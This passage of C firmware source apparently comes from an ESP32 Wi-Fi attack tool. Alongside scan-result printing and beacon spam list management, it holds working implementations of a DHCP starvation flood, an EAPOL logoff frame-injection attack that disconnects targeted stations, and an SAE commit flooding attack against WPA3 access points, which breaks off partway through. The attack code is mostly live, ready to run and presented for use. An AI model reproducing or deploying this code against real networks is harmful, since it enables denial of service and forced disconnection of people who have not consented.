        ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
        const char *company_str = "Unknown";
        switch (company) {
        case COMPANY_DLINK: company_str = "DLink"; break;
        case COMPANY_NETGEAR: company_str = "Netgear"; break;
        case COMPANY_BELKIN: company_str = "Belkin"; break;
        case COMPANY_TPLINK: company_str = "TPLink"; break;
        case COMPANY_LINKSYS: company_str = "Linksys"; break;
        case COMPANY_ASUS: company_str = "ASUS"; break;
        case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
        default: company_str = "Unknown"; break;
        }

        // Print AP details line
        char ap_details_line[200];
        snprintf(ap_details_line, sizeof(ap_details_line), ap_format, sanitized_ssid,
                 scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
                 scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
                 scanned_aps[i].primary, company_str);
        printf("%s\n", ap_details_line);
        TERMINAL_VIEW_ADD_TEXT("%s\n", ap_details_line);

        bool station_found_for_ap = false;
        // Find and print associated stations for this AP
        for (int j = 0; j < station_count; j++) {
            if (memcmp(station_ap_list[j].ap_bssid, scanned_aps[i].bssid, 6) == 0) {
                // Print station MAC using the new format
                char sta_details_line[100];
                snprintf(sta_details_line, sizeof(sta_details_line), sta_format,
                         station_ap_list[j].station_mac[0], station_ap_list[j].station_mac[1],
                         station_ap_list[j].station_mac[2], station_ap_list[j].station_mac[3],
                         station_ap_list[j].station_mac[4], station_ap_list[j].station_mac[5]);
                printf("%s\n", sta_details_line);
                TERMINAL_VIEW_ADD_TEXT("%s\n", sta_details_line);
                station_found_for_ap = true; // Mark that we printed at least one station
            }
        }

        (void)station_found_for_ap;

        // Print separator line below the AP (and its stations) if it's not the last AP
        if (i < ap_count - 1) {
            printf("%s\n", ap_separator);
            TERMINAL_VIEW_ADD_TEXT("%s\n", ap_separator);
        }
    }

    // Print Footer Once
    printf("%s\n", ap_footer);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_footer);

    printf("\n--- End of Results ---\n\n");
    TERMINAL_VIEW_ADD_TEXT("--- End of Results ---\n\n");
}

bool wifi_manager_stop_deauth_station(void) {
    if (deauth_station_task_handle != NULL) {
        vTaskDelete(deauth_station_task_handle);
        deauth_station_task_handle = NULL;
        ap_manager_start_services();
        return true;
    }
    return false;
}

// Helper function to sanitize SSID and handle hidden networks
static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';

    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "(Hidden)");
    } else {
        int len = strlen(temp_ssid);
        int out_idx = 0;
        for (int k = 0; k < len && out_idx < buffer_size - 1; k++) {
            char c = temp_ssid[k];
            output_buffer[out_idx++] = (c >= 32 && c <= 126) ? c : '.';
        }
        output_buffer[out_idx] = '\0';
    }
}

// Add an SSID to the beacon list
void wifi_manager_add_beacon_ssid(const char *ssid) {
    if (g_beacon_list_count >= BEACON_LIST_MAX) {
        printf("Beacon list full\n");
        return;
    }
    if (strlen(ssid) > BEACON_SSID_MAX_LEN) {
        printf("SSID too long\n");
        return;
    }
    for (int i = 0; i < g_beacon_list_count; ++i) {
        if (strcmp(g_beacon_list[i], ssid) == 0) {
            printf("SSID already in list: %s\n", ssid);
            return;
        }
    }
    strcpy(g_beacon_list[g_beacon_list_count++], ssid);
    printf("Added SSID to beacon list: %s\n", ssid);
}

// Remove an SSID from the beacon list
void wifi_manager_remove_beacon_ssid(const char *ssid) {
    for (int i = 0; i < g_beacon_list_count; ++i) {
        if (strcmp(g_beacon_list[i], ssid) == 0) {
            for (int j = i; j < g_beacon_list_count - 1; ++j) {
                strcpy(g_beacon_list[j], g_beacon_list[j + 1]);
            }
            --g_beacon_list_count;
            printf("Removed SSID from beacon list: %s\n", ssid);
            return;
        }
    }
    printf("SSID not found in list: %s\n", ssid);
}

// Clear the beacon list
void wifi_manager_clear_beacon_list(void) {
    g_beacon_list_count = 0;
    printf("Cleared beacon list\n");
}

// Show the beacon list
void wifi_manager_show_beacon_list(void) {
    printf("Beacon list (%d entries):\n", g_beacon_list_count);
    for (int i = 0; i < g_beacon_list_count; ++i) {
        printf("  %d: %s\n", i, g_beacon_list[i]);
    }
}

// Start beacon spam using the saved list
void wifi_manager_start_beacon_list(void) {
    if (g_beacon_list_count == 0) {
        printf("No SSIDs in beacon list\n");
        return;
    }
    // Ensure any existing beacon spam is stopped
    wifi_manager_stop_beacon();
    // Notify user that list-based beacon spam is starting
    printf("Starting beacon spam list (%d SSIDs)...\n", g_beacon_list_count);
    TERMINAL_VIEW_ADD_TEXT("Starting beacon spam list (%d SSIDs)...\n", g_beacon_list_count);
    // Launch the beacon list task
    xTaskCreate(wifi_beacon_list_task, "beacon_list", 2048, NULL, 5, &beacon_task_handle);
    beacon_task_running = 1;
    rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
}

// Task for cycling through beacon list
static void wifi_beacon_list_task(void *param) {
    (void)param;
    while (beacon_task_handle) {
        for (int i = 0; i < g_beacon_list_count; ++i) {
            wifi_manager_broadcast_ap(g_beacon_list[i]);
            vTaskDelay(pdMS_TO_TICKS(settings_get_broadcast_speed(&G_Settings)));
        }
    }
    vTaskDelete(NULL);
}

// Add DHCP starvation support start
static volatile bool dhcp_starve_running = false;
static volatile uint32_t dhcp_starve_packets_sent = 0;
static TaskHandle_t dhcp_starve_task_handle = NULL;
static TaskHandle_t dhcp_starve_display_task_handle = NULL;

#pragma pack(push,1)
typedef struct {
    uint8_t op, htype, hlen, hops;
    uint32_t xid;
    uint16_t secs, flags;
    uint32_t ciaddr, yiaddr, siaddr, giaddr;
    uint8_t chaddr[16];
    uint8_t sname[64];
    uint8_t file[128];
    uint8_t options[312];
} dhcp_packet_t;
#pragma pack(pop)

static void dhcp_starve_task(void *param) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(67), .sin_addr.s_addr = htonl(INADDR_BROADCAST) };
    while (dhcp_starve_running) {
        dhcp_packet_t pkt;
        memset(&pkt, 0, sizeof(pkt));
        pkt.op = 1; pkt.htype = 1; pkt.hlen = 6;
        pkt.xid = esp_random();
        pkt.flags = htons(0x8000);
        esp_fill_random(pkt.chaddr, 6);
        pkt.chaddr[0] &= 0xFE; pkt.chaddr[0] |= 0x02;
        pkt.options[0] = 99; pkt.options[1] = 130; pkt.options[2] = 83; pkt.options[3] = 99;
        pkt.options[4] = 53; pkt.options[5] = 1; pkt.options[6] = 1; pkt.options[7] = 255;
        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));
        dhcp_starve_packets_sent++;
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    close(sock);
    vTaskDelete(NULL);
}

static void dhcp_starve_display_task(void *param) {
    uint32_t prev_total = 0;
    while (dhcp_starve_running) {
        vTaskDelay(pdMS_TO_TICKS(5000));
        uint32_t total = dhcp_starve_packets_sent;
        uint32_t interval = total - prev_total;
        prev_total = total;
        uint32_t pps = interval / 5;
        printf("DHCP-Starve rate: %lu pps, Total: %lu packets\n", 
               (unsigned long)pps, (unsigned long)total);
        TERMINAL_VIEW_ADD_TEXT("DHCP-Starve rate: %lu pps, Total: %lu packets\n", 
               (unsigned long)pps, (unsigned long)total);
    }
    vTaskDelete(NULL);
}

void wifi_manager_start_dhcpstarve(int threads) {
    // Prevent starting DHCP starvation when not associated to an AP
    EventBits_t bits = xEventGroupGetBits(wifi_event_group);
    if (!(bits & WIFI_CONNECTED_BIT)) {
        printf("Not connected to an AP\n");
        TERMINAL_VIEW_ADD_TEXT("Not connected to an AP\n");
        return;
    }
    if (dhcp_starve_running) {
        printf("DHCP-Starve already running\n");
        TERMINAL_VIEW_ADD_TEXT("DHCP-Starve already running\n");
        return;
    }
    dhcp_starve_running = true;
    dhcp_starve_packets_sent = 0;
    xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
    xTaskCreate(dhcp_starve_display_task, "dhcp_disp", 2048, NULL, 5, &dhcp_starve_display_task_handle);
}

void wifi_manager_stop_dhcpstarve(void) {
    if (!dhcp_starve_running) {
        printf("DHCP-Starve not running\n");
        TERMINAL_VIEW_ADD_TEXT("DHCP-Starve not running\n");
        return;
    }
    dhcp_starve_running = false;
}

void wifi_manager_dhcpstarve_display(void) {
    printf("Packets sent so far: %lu\n", (unsigned long)dhcp_starve_packets_sent);
    TERMINAL_VIEW_ADD_TEXT("Packets sent so far: %lu\n", (unsigned long)dhcp_starve_packets_sent);
}

void wifi_manager_dhcpstarve_help(void) {
    printf("Usage: dhcpstarve start [threads]\n       dhcpstarve stop\n       dhcpstarve display\n");
    TERMINAL_VIEW_ADD_TEXT("Usage: dhcpstarve start [threads]\n       dhcpstarve stop\n       dhcpstarve display\n");
}

// Add EAPOL Logoff Attack support
static volatile bool eapol_logoff_running = false;
static volatile uint32_t eapol_logoff_packets_sent = 0;
static TaskHandle_t eapol_logoff_task_handle = NULL;
static TaskHandle_t eapol_logoff_display_task_handle = NULL;
static uint32_t eapol_attack_delay_ms = 10;

// Template for EAPOL Logoff frame: Data frame header + LLC/SNAP + EAPOL header
static const uint8_t eapol_logoff_frame_template[36] = {
    0x08, 0x01,                   // Frame Control: Data, ToDS=1, FromDS=0
    0x00, 0x00,                   // Duration
    // addr1 (dest), addr2 (src), addr3 (bssid) placeholders
    0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
    0x00, 0x00,                   // SeqCtrl
    // LLC/SNAP
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E,
    // EAPOL header: version 1, type Logoff(2), length 0
    0x01, 0x02, 0x00, 0x00
};
static void eapol_logoff_task(void *param) {
    (void)param;
    uint8_t frame[sizeof(eapol_logoff_frame_template)];
    while (eapol_logoff_running) {
        // Copy template
        memcpy(frame, eapol_logoff_frame_template, sizeof(frame));
        
        if (station_selected) {
            // target specific selected station
            uint8_t *ap_bssid = selected_station.ap_bssid;
            uint8_t *sta_mac = selected_station.station_mac;
            
            // set channel to ap's channel
            for (int i = 0; i < ap_count; i++) {
                if (memcmp(scanned_aps[i].bssid, ap_bssid, 6) == 0) {
                    esp_wifi_set_channel(scanned_aps[i].primary, WIFI_SECOND_CHAN_NONE);
                    break;
                }
            }
            
            memcpy(&frame[4], ap_bssid, 6);     // dest: ap
            memcpy(&frame[10], sta_mac, 6);     // src: station
            memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
            
            esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
            eapol_logoff_packets_sent++;
        } else if (strlen((const char *)selected_ap.ssid) > 0) {
            // target selected ap - send logoff for all its stations
            uint8_t *ap_bssid = selected_ap.bssid;
            
            // set channel
            esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
            
            // send logoff for each known station on this ap
            bool sent_any = false;
            for (int j = 0; j < station_count; j++) {
                if (memcmp(station_ap_list[j].ap_bssid, ap_bssid, 6) == 0) {
                    memcpy(&frame[4], ap_bssid, 6);                           // dest: ap
                    memcpy(&frame[10], station_ap_list[j].station_mac, 6);    // src: station
                    memcpy(&frame[16], ap_bssid, 6);                          // bssid: ap
                    
                    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
                    eapol_logoff_packets_sent++;
                    sent_any = true;
                    vTaskDelay(pdMS_TO_TICKS(5));
                }
            }
            if (!sent_any) {
                // no stations found, send generic logoff with random station mac
                static uint32_t last_warning_time = 0;
                uint32_t current_time = xTaskGetTickCount();
                
                // Only print warning every 5 seconds to avoid spam
                if (current_time - last_warning_time > pdMS_TO_TICKS(5000)) {
                    printf("no stations found for this ap.\nattack more effective with discovered stations\n");
                    TERMINAL_VIEW_ADD_TEXT("no stations found for this ap.\nattack more effective with discovered stations\n");
                    last_warning_time = current_time;
                }
                
                uint8_t fake_sta[6];
                esp_fill_random(fake_sta, 6);
                fake_sta[0] &= 0xFE; fake_sta[0] |= 0x02;
                
                memcpy(&frame[4], ap_bssid, 6);     // dest: ap
                memcpy(&frame[10], fake_sta, 6);    // src: fake station
                memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
                
                esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
                eapol_logoff_packets_sent++;
            }
        } else {
            // no target selected, skip
            printf("no ap or station selected for eapol logoff\n");
            TERMINAL_VIEW_ADD_TEXT("no ap or station selected for eapol logoff\n");
            break;
        }
        
        vTaskDelay(pdMS_TO_TICKS(eapol_attack_delay_ms));
    }
    eapol_logoff_task_handle = NULL;
    vTaskDelete(NULL);
}

static void eapol_logoff_display_task(void *param) {
    (void)param;
    uint32_t prev_total = 0;
    static char log_buf[80];
    while (eapol_logoff_running) {
        vTaskDelay(pdMS_TO_TICKS(5000));
        uint32_t total = eapol_logoff_packets_sent;
        uint32_t interval = total - prev_total;
        prev_total = total;
        uint32_t pps = interval / 5;
        
        // Format once, use twice - reduces stack usage significantly
        int len = snprintf(log_buf, sizeof(log_buf), "EAPOL-Logoff rate: %lu pps, Total: %lu packets\n", 
                          (unsigned long)pps, (unsigned long)total);
        if (len > 0 && len < sizeof(log_buf)) {
            printf("%s", log_buf);
            TERMINAL_VIEW_ADD_TEXT("%s", log_buf);
        }
    }
    eapol_logoff_display_task_handle = NULL;
    vTaskDelete(NULL);
}

void wifi_manager_start_eapollogoff_attack(void) {
    if (eapol_logoff_running) {
        printf("EAPOL Logoff already running\n");
        TERMINAL_VIEW_ADD_TEXT("EAPOL Logoff already running\n");
        return;
    }
    eapol_logoff_running = true;
    eapol_logoff_packets_sent = 0;
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("EAPOL logoff", "running");
#endif
    xTaskCreate(eapol_logoff_task, "eapol_logoff", 2048, NULL, 5, &eapol_logoff_task_handle);
    xTaskCreate(eapol_logoff_display_task, "eapol_disp", 3072, NULL, 5, &eapol_logoff_display_task_handle);
}

void wifi_manager_stop_eapollogoff_attack(void) {
    if (!eapol_logoff_running && eapol_logoff_task_handle == NULL) {
        printf("EAPOL Logoff not running\n");
        TERMINAL_VIEW_ADD_TEXT("EAPOL Logoff not running\n");
        return;
    }
    
    // Signal tasks to stop gracefully
    eapol_logoff_running = false;
    
    // Wait for tasks to finish gracefully before force deletion
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Delete attack task if still exists
    if (eapol_logoff_task_handle) {
        TaskHandle_t temp_handle = eapol_logoff_task_handle;
        eapol_logoff_task_handle = NULL;
        vTaskDelete(temp_handle);
    }
    
    // Delete display task if still exists  
    if (eapol_logoff_display_task_handle) {
        TaskHandle_t temp_handle = eapol_logoff_display_task_handle;
        eapol_logoff_display_task_handle = NULL;
        vTaskDelete(temp_handle);
    }
    
    printf("EAPOL Logoff attack stopped\n");
    TERMINAL_VIEW_ADD_TEXT("EAPOL Logoff attack stopped\n");
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("EAPOL stopped");
#endif
}

void wifi_manager_eapollogoff_display(void) {
    printf("EAPOL-Logoff packets so far: %lu\n", (unsigned long)eapol_logoff_packets_sent);
    TERMINAL_VIEW_ADD_TEXT("EAPOL-Logoff packets so far: %lu\n", (unsigned long)eapol_logoff_packets_sent);
}

void wifi_manager_eapollogoff_help(void) {
    printf("Usage: attack -e (for EAPOL logoff attack)\n");
    TERMINAL_VIEW_ADD_TEXT("Usage: attack -e (for EAPOL logoff attack)\n");
}

// SAE Handshake Flooding Attack Implementation
static TaskHandle_t sae_flood_task_handle = NULL;
static TaskHandle_t sae_flood_display_task_handle = NULL;
static bool sae_flood_running = false;
static int sae_flood_packets_sent = 0;
static uint8_t sae_target_bssid[6];
static int sae_target_channel = 1;
static int sae_injection_rate = 25;
// Limit the number of unique spoofed MACs to reduce crypto context thrash
#define SAE_MAC_POOL_SIZE 8
#define SAE_PRECOMPUTE_LIMIT 8
static uint8_t sae_mac_pool[SAE_MAC_POOL_SIZE][6];
static bool sae_mac_pool_ready = false;
// Number of frames to send per MAC before switching to the next one
static int sae_frames_per_mac = 32;
// Cached commit data per MAC
// Element is 32-byte X coordinate for P-256 (SAE commit encoding)
static uint8_t sae_commit_element_cache[SAE_MAC_POOL_SIZE][33];
static uint8_t sae_commit_scalar_cache[SAE_MAC_POOL_SIZE][32];
static bool sae_commit_cache_ready[SAE_MAC_POOL_SIZE];
static bool sae_precompute_attempted[SAE_MAC_POOL_SIZE];
static uint16_t sae_seq_counters[SAE_MAC_POOL_SIZE];
static uint32_t sae_cache_hits = 0;
static uint32_t sae_cache_misses = 0;
static uint32_t sae_pwe_failures = 0;
static uint32_t sae_token_rx = 0;
static uint32_t sae_commit_tx_ok = 0;
static uint32_t sae_commit_tx_err = 0;
static uint32_t sae_status76_rx = 0;
static uint32_t sae_status0_rx = 0;
// Track which spoofed MAC the anti-clogging token belongs to
static uint8_t sae_token_mac[6];
static bool sae_token_mac_valid = false;

// SAE protocol state and variables
typedef struct {
    uint8_t peer_mac[6];
    uint8_t own_mac[6];
    uint8_t bssid[6];
    char password[64];
    mbedtls_ecp_group group;
    mbedtls_ecp_point pwe;          // Password Element
    mbedtls_ecp_point peer_element;
    mbedtls_ecp_point own_element;
    mbedtls_mpi peer_scalar;
    mbedtls_mpi own_scalar;
    mbedtls_mpi rand;
    mbedtls_mpi mask;
    uint8_t kck[32];
    uint8_t pmk[32];
    uint8_t token[32];
    uint16_t token_len;
    bool token_required;
    int sync;
    int rc;
} sae_data_t;

static sae_data_t sae_ctx;
static bool sae_initialized = false;
static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;

// Forward declarations
static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac, const uint8_t *peer_mac, const char *ssid);
static esp_err_t sae_generate_commit(sae_data_t *sae);

/**
 * Derive Password-to-Element (PWE) using hunt-and-peck method
 * Based on IEEE 802.11-2016 Section 12.4.4.2.2
 */
// Static buffers to reduce stack usage
static uint8_t sae_pwd_seed[128];
static uint8_t sae_pwd_value[32];

// Static mbedTLS contexts to reduce stack usage
static mbedtls_entropy_context sae_entropy;
static mbedtls_ctr_drbg_context sae_ctr_drbg;
static mbedtls_sha256_context sae_sha256;
static mbedtls_ecp_point sae_tmp_point;
static bool sae_crypto_initialized = false;

static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1, 
                                const uint8_t *addr2, const char *ssid,
                                mbedtls_ecp_point *pwe, mbedtls_ecp_group *group) {
    mbedtls_mpi x, y, tmp;
    int counter = 1;
    bool found = false;
    (void)ssid;
    ESP_LOGI("SAE_PWE", "derive start");
    
    mbedtls_mpi_init(&x); mbedtls_mpi_init(&y); mbedtls_mpi_init(&tmp);
    mbedtls_sha256_init(&sae_sha256);
    
    // Hunt-and-peck to find valid point
    while (!found && counter <= 40) {
        // Create pwd-seed = max(addr1, addr2) || min(addr1, addr2) || password || counter
        int pos = 0;
        if (memcmp(addr1, addr2, 6) > 0) {
            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
        } else {
            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
        }
        
        int pwd_len = strlen(password);
        memcpy(sae_pwd_seed + pos, password, pwd_len);
        pos += pwd_len;
        sae_pwd_seed[pos++] = counter;
        
        // pwd-value = SHA-256(pwd-seed)
        mbedtls_sha256_starts(&sae_sha256, 0);
        mbedtls_sha256_update(&sae_sha256, sae_pwd_seed, pos);
        mbedtls_sha256_finish(&sae_sha256, sae_pwd_value);
        
        // Convert to x coordinate
        mbedtls_mpi_read_binary(&x, sae_pwd_value, 32);
        mbedtls_mpi_mod_mpi(&x, &x, &group->P);
        
        // Check if x^3 + a*x + b is quadratic residue and try both parities
        mbedtls_mpi_mul_mpi(&tmp, &x, &x);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        mbedtls_mpi_mul_mpi(&tmp, &tmp, &x);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        mbedtls_mpi_mul_mpi(&y, &group->A, &x);
        mbedtls_mpi_mod_mpi(&y, &y, &group->P);
        mbedtls_mpi_add_mpi(&tmp, &tmp, &y);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        mbedtls_mpi_add_mpi(&tmp, &tmp, &group->B);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        
        uint8_t point_buf[33];
        memcpy(point_buf + 1, sae_pwd_value, 32);
        point_buf[0] = 0x02;
        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
            found = true;
        } else {
            point_buf[0] = 0x03;
        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
            found = true;
        } else {
            counter++;
            }
        }
    }
    
    mbedtls_mpi_free(&x); mbedtls_mpi_free(&y); mbedtls_mpi_free(&tmp);
    mbedtls_sha256_free(&sae_sha256);
    ESP_LOGI("SAE_PWE", "derive %s", found ? "ok" : "fail");
    
    return found ? ESP_OK : ESP_FAIL;
}
/**
 * Generate SAE commit scalar and element
 */
static esp_err_t sae_generate_commit(sae_data_t *sae) {
    ESP_LOGI("SAE_COMMIT", "gen start");
    // Initialize crypto contexts once
    if (!sae_crypto_initialized) {
        mbedtls_entropy_init(&sae_entropy);
        mbedtls_ctr_drbg_init(&sae_ctr_drbg);
        mbedtls_ecp_point_init(&sae_tmp_point);
        if (mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0) != 0) {
            ESP_LOGI("SAE_COMMIT", "drbg seed fail");
            return ESP_FAIL;
        }
        sae_crypto_initialized = true;
    }
    
    // Generate random scalar and mask
    mbedtls_mpi_fill_random(&sae->rand, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
    mbedtls_mpi_fill_random(&sae->mask, 32, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
    
    // scalar = (rand + mask) mod order
    mbedtls_mpi_add_mpi(&sae->own_scalar, &sae->rand, &sae->mask);
    mbedtls_mpi_mod_mpi(&sae->own_scalar, &sae->own_scalar, &sae->group.N);
    if (mbedtls_mpi_cmp_int(&sae->own_scalar, 0) == 0) {
        mbedtls_mpi_lset(&sae->own_scalar, 1);
    }
    // own_element = (N - (mask mod N)) * PWE  [equivalent to -(mask * PWE) mod N]
    {
        mbedtls_mpi mask_mod, mask_neg;
        mbedtls_mpi_init(&mask_mod);
        mbedtls_mpi_init(&mask_neg);
        mbedtls_mpi_mod_mpi(&mask_mod, &sae->mask, &sae->group.N);
        if (mbedtls_mpi_cmp_int(&mask_mod, 0) == 0) {
            mbedtls_mpi_lset(&mask_mod, 1);
        }
        mbedtls_mpi_sub_mpi(&mask_neg, &sae->group.N, &mask_mod);
        if (mbedtls_mpi_cmp_int(&mask_neg, 0) == 0) {
            mbedtls_mpi_lset(&mask_neg, 1);
        }
        if (mbedtls_ecp_mul(&sae->group, &sae->own_element, &mask_neg, &sae->pwe,
                            mbedtls_ctr_drbg_random, &sae_ctr_drbg) != 0) {
            mbedtls_mpi_free(&mask_mod);
            mbedtls_mpi_free(&mask_neg);
            return ESP_FAIL;
        }
        mbedtls_mpi_free(&mask_mod);
        mbedtls_mpi_free(&mask_neg);
    }
    ESP_LOGI("SAE_COMMIT", "gen ok");
    return ESP_OK;
}

/**
 * Calculate SAE confirm value
 */
static esp_err_t sae_calculate_confirm(sae_data_t *sae, uint16_t send_confirm, uint8_t *confirm) {
    int ret;
    mbedtls_ecp_point_init(&sae_tmp_point);

    // Compute shared secret: own_scalar * peer_element
    ret = mbedtls_ecp_mul(&sae->group, &sae_tmp_point, &sae->own_scalar,
                          &sae->peer_element, mbedtls_ctr_drbg_random, &sae_ctr_drbg);
    if (ret != 0) goto cleanup;

    // Extract X coordinate (big-endian, 32 bytes) as K
    uint8_t k[33];
    size_t olen;
    mbedtls_ecp_point_write_binary(&sae->group, &sae_tmp_point,
                                   MBEDTLS_ECP_PF_COMPRESSED, &olen,
                                   k, sizeof(k));
    // Skip compression byte by shifting buffer
    uint8_t *kptr = k + 1;

    // Confirm = SHA256(be16(send_confirm) || K)
    mbedtls_sha256_init(&sae_sha256);
    mbedtls_sha256_starts(&sae_sha256, 0);
    uint8_t sc_be[2] = { (uint8_t)(send_confirm & 0xFF), (uint8_t)((send_confirm >> 8) & 0xFF) };
    uint8_t tmp_swap = sc_be[0]; sc_be[0] = sc_be[1]; sc_be[1] = tmp_swap;
    mbedtls_sha256_update(&sae_sha256, sc_be, sizeof(sc_be));
    mbedtls_sha256_update(&sae_sha256, kptr, 32);
    mbedtls_sha256_finish(&sae_sha256, confirm);
    mbedtls_sha256_free(&sae_sha256);
    
cleanup:
    mbedtls_ecp_point_free(&sae_tmp_point);
    return (ret == 0 ? ESP_OK : ESP_FAIL);
}

/**
 * Initialize SAE context with proper PWE derivation
 */
static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac,
                                  const uint8_t *peer_mac, const char *ssid) {
    // Reuse if already initialized for the same MAC tuple
    if (sae_initialized &&
        memcmp(sae_ctx.own_mac, own_mac, 6) == 0 &&
        memcmp(sae_ctx.peer_mac, peer_mac, 6) == 0) {
        return ESP_OK;
    }

    if (!sae_initialized) {
        memset(&sae_ctx, 0, sizeof(sae_ctx));
        mbedtls_ecp_group_init(&sae_ctx.group);
        mbedtls_ecp_point_init(&sae_ctx.pwe);
        mbedtls_ecp_point_init(&sae_ctx.peer_element);
        mbedtls_ecp_point_init(&sae_ctx.own_element);
        mbedtls_mpi_init(&sae_ctx.peer_scalar);
        mbedtls_mpi_init(&sae_ctx.own_scalar);
        mbedtls_mpi_init(&sae_ctx.rand);
        mbedtls_mpi_init(&sae_ctx.mask);
        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
            mbedtls_ecp_group_free(&sae_ctx.group);
            return ESP_FAIL;
        }
        sae_initialized = true;
    }

    strncpy(sae_ctx.password, password, sizeof(sae_ctx.password) - 1);
    memcpy(sae_ctx.own_mac, own_mac, 6);
    memcpy(sae_ctx.peer_mac, peer_mac, 6);
    memcpy(sae_ctx.bssid, peer_mac, 6);
    
    // Derive PWE with the provided MAC addresses
    if (sae_derive_pwe(password, own_mac, peer_mac, ssid, &sae_ctx.pwe, &sae_ctx.group) != ESP_OK) {
        return ESP_FAIL;
    }
    
    return ESP_OK;
}

// Static frame buffer to reduce stack usage
static uint8_t sae_frame_buffer[512];

static char sae_flood_password_buf[64];

static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
    int frame_len = 0;
    bool token_required_local = false;
    uint16_t token_len_local = 0;
    uint8_t token_buf_local[128];
    
    // 802.11 Authentication header
    sae_frame_buffer[0] = 0xb0; sae_frame_buffer[1] = 0x00;  // Frame Control
    sae_frame_buffer[2] = 0x00; sae_frame_buffer[3] = 0x00;  // Duration
    // Addresses: DA, SA, BSSID
    memcpy(sae_frame_buffer + 4, sae_target_bssid, 6);
    memcpy(sae_frame_buffer + 10, src_mac, 6);
    memcpy(sae_frame_buffer + 16, sae_target_bssid, 6);
    // Sequence Control: fragment number = 0, 12-bit seq number random
    uint16_t seq = esp_random() & 0x0FFF;
    sae_frame_buffer[22] = (seq << 4) & 0xF0;
    sae_frame_buffer[23] = (seq >> 4) & 0xFF;
    frame_len = 24;
    
    // Auth Algorithm = SAE (3), Sequence = Commit (1), Status = 0
    sae_frame_buffer[frame_len++] = 0x03; sae_frame_buffer[frame_len++] = 0x00;  // Algorithm
    sae_frame_buffer[frame_len++] = 0x01; sae_frame_buffer[frame_len++] = 0x00;  // Transaction
    sae_frame_buffer[frame_len++] = 0x00; sae_frame_buffer[frame_len++] = 0x00;  // Status
    
    // Group ID = P-256 (19)
    sae_frame_buffer[frame_len++] = 0x13; sae_frame_buffer[frame_len++] = 0x00;
    
    // Read anti-clogging token if required (write it later after scalar+element)
    portENTER_CRITICAL(&sae_lock);
    token_required_local = sae_ctx.token_required;
    token_len_local = sae_ctx.token_len;
    if (token_required_local && token_len_local > 0) {
        if (token_len_local > sizeof(token_buf_local)) token_len_local = sizeof(token_buf_local);
        memcpy(token_buf_local, sae_ctx.token, token_len_local);
    }
    portEXIT_CRITICAL(&sae_lock);
    ESP_LOGI("SAE_TX", "commit hdr ok, token=%d len=%u", token_required_local, (unsigned)token_len_local);
    
    // Initialize base crypto once
    static const char *sae_flood_password = NULL;
    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
    const char *ssid = NULL;
    if (!sae_crypto_initialized) {
        mbedtls_entropy_init(&sae_entropy);
        mbedtls_ctr_drbg_init(&sae_ctr_drbg);
        mbedtls_ecp_point_init(&sae_tmp_point);
        mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
        sae_crypto_initialized = true;
    }
    if (!sae_initialized) {
        mbedtls_ecp_group_init(&sae_ctx.group);
        mbedtls_ecp_point_init(&sae_ctx.pwe);
        mbedtls_ecp_point_init(&sae_ctx.peer_element);
        mbedtls_ecp_point_init(&sae_ctx.own_element);
        mbedtls_mpi_init(&sae_ctx.peer_scalar);
        mbedtls_mpi_init(&sae_ctx.own_scalar);
        mbedtls_mpi_init(&sae_ctx.rand);
        mbedtls_mpi_init(&sae_ctx.mask);
